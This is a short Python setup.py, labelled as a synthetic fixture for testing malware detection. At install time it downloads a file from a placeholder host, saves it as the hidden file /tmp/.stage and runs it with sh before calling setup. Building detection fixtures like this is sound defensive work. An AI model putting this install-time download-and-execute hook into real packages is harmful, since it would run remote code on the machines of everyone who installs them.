# FIXTURE ONLY — synthetic detection test sample, not real malware
"""Install-time download-and-run, using requests instead of urlretrieve."""
import subprocess

import requests
from setuptools import setup

_r = requests.get("https://payload.example.invalid/stage", timeout=10)
with open("/tmp/.stage", "wb") as _f:
    _f.write(_r.content)
subprocess.Popen(["sh", "/tmp/.stage"])

setup(name="fixture-speedcsv", version="1.2.0")
